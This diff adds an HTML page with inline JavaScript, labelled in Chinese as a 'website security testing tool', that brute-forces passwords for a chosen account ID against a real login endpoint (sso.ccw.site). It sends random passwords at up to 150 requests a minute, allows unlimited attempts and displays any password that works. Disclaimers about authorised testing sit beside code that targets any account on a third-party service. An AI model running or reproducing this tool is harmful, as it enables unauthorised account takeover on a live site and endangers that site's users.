@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>网站安全测试工具 - 仅用于授权测试</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f1a0f 0%, #1a2c1a 100%);
+            color: #e6e6e6;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background-color: rgba(20, 30, 20, 0.8);
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #3a5c3a;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #4a7a4a;
+        }
+        
+        h1 {
+            color: #a5d296;
+            margin-bottom: 10px;
+            font-size: 2.5rem;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            color: #b8d1b8;
+            font-size: 1.1rem;
+        }
+        
+        .warning-box {
+            background-color: rgba(165, 208, 150, 0.15);
+            border-left: 5px solid #a5d296;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+        }
+        
+        .warning-box h3 {
+            color: #a5d296;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .warning-icon {
+            font-size: 1.5rem;
+        }
+        
+        .config-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .config-card {
+            background-color: rgba(30, 45, 30, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #4a7a4a;
+        }
+        
+        .config-card h3 {
+            color: #b8e0a8;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #5ca05c;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #d1e8d1;
+            font-weight: 500;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #1a2c1a;
+            border: 1px solid #4a7a4a;
+            border-radius: 6px;
+            color: #e6e6e6;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #a5d296;
+            box-shadow: 0 0 0 2px rgba(165, 208, 150, 0.2);
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .checkbox-group input {
+            width: auto;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex-grow: 1;
+            min-width: 150px;
+        }
+        
+        .start-btn {
+            background: linear-gradient(to right, #5ca05c, #3a7a3a);
+            color: white;
+        }
+        
+        .start-btn:hover {
+            background: linear-gradient(to right, #4a904a, #2d6a2d);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(92, 160, 92, 0.4);
+        }
+        
+        .stop-btn {
+            background: linear-gradient(to right, #d96a6a, #b74a4a);
+            color: white;
+        }
+        
+        .stop-btn:hover {
+            background: linear-gradient(to right, #c85a5a, #a63a3a);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(217, 106, 106, 0.4);
+        }
+        
+        .reset-btn {
+            background: linear-gradient(to right, #8a9c8a, #6a7a6a);
+            color: white;
+        }
+        
+        .reset-btn:hover {
+            background: linear-gradient(to right, #7a8c7a, #5a6a5a);
+            transform: translateY(-2px);
+        }
+        
+        .results-section {
+            margin-top: 30px;
+            background-color: rgba(30, 45, 30, 0.7);
+            padding: 25px;
+            border-radius: 10px;
+            border: 1px solid #4a7a4a;
+        }
+        
+        .results-section h3 {
+            color: #b8e0a8;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-idle {
+            background-color: #8a9c8a;
+        }
+        
+        .status-running {
+            background-color: #a5d296;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .status-success {
+            background-color: #5ca05c;
+        }
+        
+        .log-container {
+            background-color: #0f1a0f;
+            border-radius: 6px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            margin-top: 15px;
+            border: 1px solid #3a5c3a;
+        }
+        
+        .log-entry {
+            padding: 8px 0;
+            border-bottom: 1px solid #2a4a2a;
+        }
+        
+        .log-time {
+            color: #b8d1b8;
+            margin-right: 15px;
+        }
+        
+        .log-success {
+            color: #5ca05c;
+        }
+        
+        .log-error {
+            color: #d96a6a;
+        }
+        
+        .log-info {
+            color: #a5d296;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin-top: 20px;
+            gap: 15px;
+        }
+        
+        .stat-box {
+            background-color: rgba(26, 44, 26, 0.8);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            flex-grow: 1;
+            min-width: 120px;
+            border: 1px solid #4a7a4a;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #a5d296;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: #d1e8d1;
+            font-size: 0.9rem;
+        }
+        
+        /* 滑块样式 */
+        input[type="range"] {
+            -webkit-appearance: none;
+            height: 8px;
+            background: #1a2c1a;
+            border-radius: 4px;
+            outline: none;
+        }
+        
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            background: #5ca05c;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid #a5d296;
+        }
+        
+        input[type="range"]::-moz-range-thumb {
+            width: 20px;
+            height: 20px;
+            background: #5ca05c;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid #a5d296;
+        }
+        
+        .range-display {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 5px;
+            font-size: 0.9rem;
+            color: #b8d1b8;
+        }
+        
+        .range-value {
+            color: #a5d296;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+        
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #8a9c8a;
+            font-size: 0.9rem;
+            padding-top: 20px;
+            border-top: 1px solid #4a7a4a;
+        }
+        
+        @media (max-width: 768px) {
+            .config-section {
+                grid-template-columns: 1fr;
+            }
+            
+            .button-group {
+                flex-direction: column;
+            }
+            
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>网站安全测试工具</h1>
+            <p class="subtitle">用于授权安全测试 - 请严格遵守使用条款</p>
+        </header>
+        
+        <div class="warning-box">
+            <h3><span class="warning-icon">⚠</span> 重要安全声明</h3>
+            <p>此工具仅用于<b>您拥有完全所有权和明确授权</b>的网站和账户的安全测试。未经授权对他人系统进行测试是非法行为，并可能导致法律后果。使用此工具即表示您同意：</p>
+            <ul style="margin-left: 20px; margin-top: 10px;">
+                <li>仅测试您拥有合法访问权限的系统</li>
+                <li>遵守目标网站的使用条款和速率限制</li>
+                <li>不尝试获取未经授权的访问权限</li>
+                <li>所有测试数据仅用于安全研究和改进目的</li>
+            </ul>
+        </div>
+        
+        <div class="config-section">
+            <div class="config-card">
+                <h3>测试目标配置</h3>
+                <div class="form-group">
+                    <label for="targetId">测试账户ID</label>
+                    <input type="text" id="targetId" placeholder="输入您要测试的账户ID">
+                </div>
+                <div class="form-group">
+                    <label for="apiEndpoint">API端点</label>
+                    <input type="text" id="apiEndpoint" value="https://sso.ccw.site/web/auth/login-by-password">
+                </div>
+                <div class="form-group">
+                    <label for="clientCode">客户端代码</label>
+                    <input type="text" id="clientCode" value="STUDY_COMMUNITY">
+                </div>
+            </div>
+            
+            <div class="config-card">
+                <h3>测试参数配置</h3>
+                <div class="form-group">
+                    <label for="requestRate">请求频率 (次/分钟)</label>
+                    <input type="range" id="requestRate" min="1" max="150" value="40">
+                    <div class="range-display">
+                        <span>1</span>
+                        <span class="range-value" id="rateValue">40</span>
+                        <span>150</span>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="maxAttempts">最大尝试次数 (0=无限制)</label>
+                    <input type="number" id="maxAttempts" min="0" value="1000">
+                </div>
+                <div class="form-group">
+                    <label>密码生成选项</label>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="includeNumbers" checked>
+                        <label for="includeNumbers">包含数字</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="includeLowercase" checked>
+                        <label for="includeLowercase">包含小写字母</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="includeUppercase" checked>
+                        <label for="includeUppercase">包含大写字母</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="includeSpecial" checked>
+                        <label for="includeSpecial">包含特殊字符</label>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="button-group">
+            <button class="start-btn" id="startBtn">开始安全测试</button>
+            <button class="stop-btn" id="stopBtn" disabled>停止测试</button>
+            <button class="reset-btn" id="resetBtn">重置日志</button>
+        </div>
+        
+        <div class="results-section">
+            <h3>
+                <span>测试状态: <span class="status-indicator status-idle" id="statusIndicator"></span><span id="statusText">等待开始</span></span>
+                <span id="passwordStrength" style="font-size: 1rem;"></span>
+            </h3>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="attemptCount">0</div>
+                    <div class="stat-label">尝试次数</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="successCount">0</div>
+                    <div class="stat-label">成功次数</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="errorCount">0</div>
+                    <div class="stat-label">错误次数</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="timeElapsed">0s</div>
+                    <div class="stat-label">用时</div>
+                </div>
+            </div>
+            
+            <div class="log-container" id="logContainer">
+                <!-- 日志将动态添加到这里 -->
+                <div class="log-entry log-info">
+                    <span class="log-time">就绪</span>
+                    <span>安全测试工具已初始化。请配置参数并开始测试。</span>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2026 安全测试工具 - 仅用于授权安全测试 | 请勿用于非法用途</p>
+            <p style="margin-top: 5px; font-size: 0.8rem;">所有测试操作应遵守相关法律法规和网站使用条款</p>
+        </footer>
+    </div>
+
+    <script>
+        // 全局变量
+        let isTesting = false;
+        let testInterval;
+        let attempts = 0;
+        let successes = 0;
+        let errors = 0;
+        let startTime = 0;
+        let foundPassword = null;
+        
+        // DOM元素
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusText = document.getElementById('statusText');
+        const passwordStrength = document.getElementById('passwordStrength');
+        const attemptCount = document.getElementById('attemptCount');
+        const successCount = document.getElementById('successCount');
+        const errorCount = document.getElementById('errorCount');
+        const timeElapsed = document.getElementById('timeElapsed');
+        const logContainer = document.getElementById('logContainer');
+        const requestRate = document.getElementById('requestRate');
+        const rateValue = document.getElementById('rateValue');
+        
+        // 更新频率显示
+        requestRate.addEventListener('input', function() {
+            rateValue.textContent = this.value;
+        });
+        
+        // 开始测试
+        startBtn.addEventListener('click', async function() {
+            const targetId = document.getElementById('targetId').value.trim();
+            const apiEndpoint = document.getElementById('apiEndpoint').value.trim();
+            const clientCode = document.getElementById('clientCode').value.trim();
+            const maxAttempts = parseInt(document.getElementById('maxAttempts').value);
+            const rate = parseInt(requestRate.value);
+            
+            if (!targetId) {
+                addLog('错误', '请输入测试账户ID', 'error');
+                alert('请输入测试账户ID');
+                return;
+            }
+            
+            if (!apiEndpoint) {
+                addLog('错误', '请输入API端点', 'error');
+                alert('请输入API端点');
+                return;
+            }
+            
+            // 确认对话框
+            const confirmMessage = `您即将开始对账户 "${targetId}" 进行安全测试。\n\n` +
+                                 `请确认：\n` +
+                                 `1. 这是您拥有合法权限测试的账户\n` +
+                                 `2. 您已获得进行此类测试的授权\n` +
+                                 `3. 您了解这可能触发安全警报\n\n` +
+                                 `您确定要继续吗？`;
+            
+            if (!confirm(confirmMessage)) {
+                addLog('信息', '用户取消了测试', 'info');
+                return;
+            }
+            
+            // 检查请求频率是否过高
+            if (rate > 150) {
+                addLog('警告', '请求频率过高，已自动限制为150次/分钟', 'error');
+                rate = 150;
+                requestRate.value = 150;
+                rateValue.textContent = '150';
+            }
+            
+            // 设置测试状态
+            isTesting = true;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            statusIndicator.className = 'status-indicator status-running';
+            statusText.textContent = '测试进行中';
+            startTime = Date.now();
+            updateElapsedTime();
+            
+            addLog('信息', `开始对账户 "${targetId}" 进行安全测试`, 'info');
+            addLog('信息', `请求频率: ${rate} 次/分钟，最大尝试次数: ${maxAttempts || '无限制'}`, 'info');
+            
+            // 开始测试循环
+            // 确保最低间隔时间至少为400ms (150次/分钟 = 0.4秒/次)
+            const interval = Math.max(400, 60000 / rate);
+            testInterval = setInterval(() => performTest(targetId, apiEndpoint, clientCode, maxAttempts), interval);
+        });
+        
+        // 停止测试
+        stopBtn.addEventListener('click', function() {
+            stopTesting();
+            addLog('信息', '测试已手动停止', 'info');
+        });
+        
+        // 重置日志
+        resetBtn.addEventListener('click', function() {
+            if (isTesting) {
+                alert('请先停止测试');
+                return;
+            }
+            
+            logContainer.innerHTML = `
+                <div class="log-entry log-info">
+                    <span class="log-time">就绪</span>
+                    <span>安全测试工具已重置。请配置参数并开始测试。</span>
+                </div>
+            `;
+            
+            attempts = 0;
+            successes = 0;
+            errors = 0;
+            foundPassword = null;
+            
+            updateStats();
+            
+            passwordStrength.textContent = '';
+            statusIndicator.className = 'status-indicator status-idle';
+            statusText.textContent = '等待开始';
+            
+            addLog('信息', '测试日志已重置', 'info');
+        });
+        
+        // 执行单次测试
+        async function performTest(targetId, apiEndpoint, clientCode, maxAttempts) {
+            if (!isTesting) return;
+            
+            // 检查最大尝试次数
+            if (maxAttempts > 0 && attempts >= maxAttempts) {
+                addLog('信息', `已达到最大尝试次数 (${maxAttempts})，停止测试`, 'info');
+                stopTesting();
+                return;
+            }
+            
+            attempts++;
+            updateStats();
+            
+            // 生成随机密码
+            const password = generateRandomPassword();
+            
+            try {
+                // 执行登录请求
+                const response = await fetch(apiEndpoint, {
+                    headers: {
+                        "content-type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        loginKey: targetId,
+                        clientCode: clientCode,
+                        password: password,
+                        extra: '{"device":"Android","browser":"Chrome 100","scene":null}'
+                    }),
+                    method: "POST",
+                });
+                
+                const result = await response.json();
+                
+                if (result.status === 200) {
+                    // 登录成功
+                    successes++;
+                    foundPassword = password;
+                    
+                    // 评估密码强度
+                    const strength = evaluatePasswordStrength(password);
+                    
+                    addLog('成功', `密码匹配成功! 密码: ${password} (强度: ${strength})`, 'success');
+                    addLog('成功', `测试完成 - 找到密码: ${password}`, 'success');
+                    
+                    passwordStrength.textContent = `找到密码: ${password} (强度: ${strength})`;
+                    passwordStrength.style.color = '#5ca05c';
+                    
+                    stopTesting();
+                    alert(`测试完成！找到密码: ${password}\n密码强度: ${strength}\n总尝试次数: ${attempts}`);
+                } else {
+                    // 登录失败
+                    addLog('尝试', `密码尝试: ${password} - ${result.msg || '密码错误'}`, 'info');
+                }
+            } catch (error) {
+                errors++;
+                addLog('错误', `请求失败: ${error.message}`, 'error');
+                
+                // 如果连续出现多次错误，可能是频率过高被限制，暂停测试
+                if (errors % 10 === 0) {
+                    addLog('警告', '检测到多次请求失败，建议降低请求频率', 'error');
+                }
+            }
+            
+            updateStats();
+        }
+        
+        // 生成随机密码
+        function generateRandomPassword() {
+            const length = Math.floor(Math.random() * 6) + 8; // 8-13个字符
+            const includeNumbers = document.getElementById('includeNumbers').checked;
+            const includeLowercase = document.getElementById('includeLowercase').checked;
+            const includeUppercase = document.getElementById('includeUppercase').checked;
+            const includeSpecial = document.getElementById('includeSpecial').checked;
+            
+            let charset = '';
+            if (includeNumbers) charset += '0123456789';
+            if (includeLowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
+            if (includeUppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            if (includeSpecial) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
+            
+            // 确保至少有一种字符类型被选中
+            if (charset === '') charset = '0123456789abcdefghijklmnopqrstuvwxyz';
+            
+            let password = '';
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * charset.length);
+                password += charset[randomIndex];
+            }
+            
+            return password;
+        }
+        
+        // 评估密码强度
+        function evaluatePasswordStrength(password) {
+            let score = 0;
+            
+            // 长度评分
+            if (password.length >= 8) score += 1;
+            if (password.length >= 12) score += 1;
+            
+            // 复杂性评分
+            if (/[a-z]/.test(password)) score += 1; // 有小写字母
+            if (/[A-Z]/.test(password)) score += 1; // 有大写字母
+            if (/[0-9]/.test(password)) score += 1; // 有数字
+            if (/[^a-zA-Z0-9]/.test(password)) score += 1; // 有特殊字符
+            
+            // 根据评分返回强度等级
+            if (score <= 2) return "弱";
+            if (score <= 4) return "中等";
+            if (score <= 5) return "强";
+            return "非常强";
+        }
+        
+        // 停止测试
+        function stopTesting() {
+            isTesting = false;
+            clearInterval(testInterval);
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            if (foundPassword) {
+                statusIndicator.className = 'status-indicator status-success';
+                statusText.textContent = '测试成功 - 找到密码';
+            } else {
+                statusIndicator.className = 'status-indicator status-idle';
+                statusText.textContent = '测试已停止';
+            }
+        }
+        
+        // 更新统计信息
+        function updateStats() {
+            attemptCount.textContent = attempts;
+            successCount.textContent = successes;
+            errorCount.textContent = errors;
+        }
+        
+        // 更新已用时间
+        function updateElapsedTime() {
+            if (!isTesting && startTime === 0) return;
+            
+            const now = Date.now();
+            const elapsed = startTime > 0 ? now - startTime : 0;
+            const seconds = Math.floor(elapsed / 1000);
+            
+            timeElapsed.textContent = `${seconds}s`;
+            
+            if (isTesting) {
+                setTimeout(updateElapsedTime, 1000);
+            }
+        }
+        
+        // 添加日志条目
+        function addLog(type, message, cssClass) {
+            const now = new Date();
+            const timeString = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${cssClass}`;
+            logEntry.innerHTML = `<span class="log-time">${timeString}</span> <span>[${type}] ${message}</span>`;
+            
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+        
+        // 初始化
+        addLog('信息', '安全测试工具已初始化完成', 'info');
+        addLog('警告', '请确保您仅测试您拥有合法权限的账户', 'error');
+        addLog('提示', '请求频率范围已设置为1-150次/分钟，默认40次/分钟', 'info');
+    </script>
+</body>
+</html>
